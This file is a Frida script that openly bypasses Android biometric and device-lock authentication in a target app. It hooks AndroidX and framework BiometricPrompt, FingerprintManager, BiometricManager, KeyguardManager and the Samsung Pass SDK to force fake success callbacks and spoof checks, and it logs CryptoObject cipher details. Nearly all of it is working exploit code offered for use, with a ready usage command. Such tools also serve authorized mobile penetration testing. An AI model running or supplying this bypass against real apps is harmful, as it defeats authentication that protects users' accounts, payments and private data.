/*
 * Android Biometric Authentication Bypass — Frida Script
 *
 * Usage:
 *   frida -U -l bypass_biometric.js -f com.target.app --no-pause
 *
 * Bypasses:
 *   - BiometricPrompt (AndroidX)
 *   - FingerprintManager (deprecated API)
 *   - BiometricManager canAuthenticate check
 *   - CryptoObject extraction
 *   - KeyguardManager device lock check
 */

Java.perform(function () {
    var TAG = "[Bio-Bypass]";

    // ============================================================
    // 1. AndroidX BiometricPrompt — Force success callback
    // ============================================================
    try {
        var BiometricPrompt = Java.use("androidx.biometric.BiometricPrompt");
        var AuthResult = Java.use("androidx.biometric.BiometricPrompt$AuthenticationResult");
        var CryptoObject = Java.use("androidx.biometric.BiometricPrompt$CryptoObject");

        BiometricPrompt.authenticate.overload(
            "androidx.biometric.BiometricPrompt$PromptInfo"
        ).implementation = function (info) {
            console.log(TAG + " BiometricPrompt.authenticate intercepted (no crypto)");
            // Get the callback field
            var callbackField = this.getClass().getDeclaredField("mAuthenticationCallback");
            callbackField.setAccessible(true);
            var callback = callbackField.get(this);

            // Create fake success result
            var fakeResult = AuthResult.$new(null);

            // Trigger success callback on main thread
            Java.scheduleOnMainThread(function () {
                callback.onAuthenticationSucceeded(fakeResult);
                console.log(TAG + " BiometricPrompt success callback triggered");
            });
        };

        BiometricPrompt.authenticate.overload(
            "androidx.biometric.BiometricPrompt$PromptInfo",
            "androidx.biometric.BiometricPrompt$CryptoObject"
        ).implementation = function (info, crypto) {
            console.log(TAG + " BiometricPrompt.authenticate intercepted (with CryptoObject)");
            var callbackField = this.getClass().getDeclaredField("mAuthenticationCallback");
            callbackField.setAccessible(true);
            var callback = callbackField.get(this);

            // Pass the original CryptoObject to fake success
            var fakeResult = AuthResult.$new(crypto);
            Java.scheduleOnMainThread(function () {
                callback.onAuthenticationSucceeded(fakeResult);
                console.log(TAG + " BiometricPrompt crypto success triggered");
            });
        };
        console.log(TAG + " BiometricPrompt hooks loaded");
    } catch (e) {
        console.log(TAG + " BiometricPrompt hook error: " + e);
    }

    // ============================================================
    // 2. FingerprintManager (deprecated, still used in older apps)
    // ============================================================
    try {
        var FingerprintManager = Java.use("android.hardware.fingerprint.FingerprintManager");

        FingerprintManager.authenticate.implementation = function (crypto, cancel, flags, callback, handler) {
            console.log(TAG + " FingerprintManager.authenticate intercepted");

            // Create a fake AuthenticationResult
            var AuthResult2 = Java.use("android.hardware.fingerprint.FingerprintManager$AuthenticationResult");
            var fakeResult;
            if (crypto) {
                fakeResult = AuthResult2.$new(crypto, null, 0, 0);
            } else {
                fakeResult = AuthResult2.$new(null, null, 0, 0);
            }

            // Trigger success
            callback.onAuthenticationSucceeded(fakeResult);
            console.log(TAG + " FingerprintManager success triggered");
        };

        FingerprintManager.isHardwareDetected.implementation = function () {
            console.log(TAG + " isHardwareDetected → true");
            return true;
        };

        FingerprintManager.hasEnrolledFingerprints.implementation = function () {
            console.log(TAG + " hasEnrolledFingerprints → true");
            return true;
        };
        console.log(TAG + " FingerprintManager hooks loaded");
    } catch (e) { }

    // ============================================================
    // 3. BiometricManager — canAuthenticate check
    // ============================================================
    try {
        var BiometricManager = Java.use("androidx.biometric.BiometricManager");
        BiometricManager.canAuthenticate.overload("int").implementation = function (authenticators) {
            console.log(TAG + " canAuthenticate → BIOMETRIC_SUCCESS");
            return 0; // BIOMETRIC_SUCCESS
        };
        BiometricManager.canAuthenticate.overload().implementation = function () {
            console.log(TAG + " canAuthenticate → BIOMETRIC_SUCCESS");
            return 0;
        };
    } catch (e) { }

    // Android framework BiometricManager
    try {
        var SysBiometricManager = Java.use("android.hardware.biometrics.BiometricManager");
        SysBiometricManager.canAuthenticate.overload("int").implementation = function (authenticators) {
            return 0;
        };
        SysBiometricManager.canAuthenticate.overload().implementation = function () {
            return 0;
        };
    } catch (e) { }

    // ============================================================
    // 4. Android BiometricPrompt (framework, not AndroidX)
    // ============================================================
    try {
        var SysBiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
        SysBiometricPrompt.authenticate.overload(
            "android.hardware.biometrics.BiometricPrompt$CryptoObject",
            "android.os.CancellationSignal",
            "java.util.concurrent.Executor",
            "android.hardware.biometrics.BiometricPrompt$AuthenticationCallback"
        ).implementation = function (crypto, cancel, executor, callback) {
            console.log(TAG + " System BiometricPrompt intercepted");
            var SysAuthResult = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
            var fakeResult = SysAuthResult.$new(crypto);
            callback.onAuthenticationSucceeded(fakeResult);
        };
    } catch (e) { }

    // ============================================================
    // 5. KeyguardManager — Device lock bypass
    // ============================================================
    try {
        var KeyguardManager = Java.use("android.app.KeyguardManager");
        KeyguardManager.isKeyguardSecure.implementation = function () {
            console.log(TAG + " isKeyguardSecure → true");
            return true;
        };
        KeyguardManager.isDeviceSecure.implementation = function () {
            console.log(TAG + " isDeviceSecure → true");
            return true;
        };
        KeyguardManager.isKeyguardLocked.implementation = function () {
            console.log(TAG + " isKeyguardLocked → false");
            return false;
        };
    } catch (e) { }

    // ============================================================
    // 6. CryptoObject extraction — Log cipher details
    // ============================================================
    try {
        var BioCrypto = Java.use("androidx.biometric.BiometricPrompt$CryptoObject");
        BioCrypto.getCipher.implementation = function () {
            var cipher = this.getCipher();
            if (cipher) {
                console.log(TAG + " CryptoObject.getCipher: " + cipher.getAlgorithm());
            }
            return cipher;
        };
        BioCrypto.getSignature.implementation = function () {
            var sig = this.getSignature();
            if (sig) {
                console.log(TAG + " CryptoObject.getSignature: " + sig.getAlgorithm());
            }
            return sig;
        };
    } catch (e) { }

    // ============================================================
    // 7. Samsung PASS / vendor SDK
    // ============================================================
    try {
        var SPass = Java.use("com.samsung.android.sdk.pass.Spass");
        SPass.isFeatureEnabled.implementation = function (feature) {
            console.log(TAG + " Samsung PASS isFeatureEnabled → true");
            return true;
        };
    } catch (e) { }
    try {
        var SPassFingerprint = Java.use("com.samsung.android.sdk.pass.SpassFingerprint");
        SPassFingerprint.startIdentify.implementation = function (callback) {
            console.log(TAG + " Samsung startIdentify → success");
            callback.onFinished(0); // STATUS_AUTHENTIFICATION_SUCCESS
        };
    } catch (e) { }

    console.log(TAG + " === Biometric Bypass Active ===");
});
